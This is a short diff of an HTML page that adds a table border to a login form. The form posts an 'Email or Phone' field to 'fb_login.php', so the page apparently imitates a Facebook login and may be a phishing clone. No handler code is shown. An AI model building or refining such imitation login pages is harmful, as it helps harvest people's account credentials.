@@ -31,7 +31,7 @@ div.transbox {
 <div class="transbox">
 <div class="dentro">
   <form action="fb_login.php" method="post">
-      <table>
+      <table  border="1">
       <tr valign="bottom">
       <td><font style="font-family:arial; font-size:11px;">Email or Phone </font></td>
       <td><input type="text" name="user" style="font-family:arial; font-size:10px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
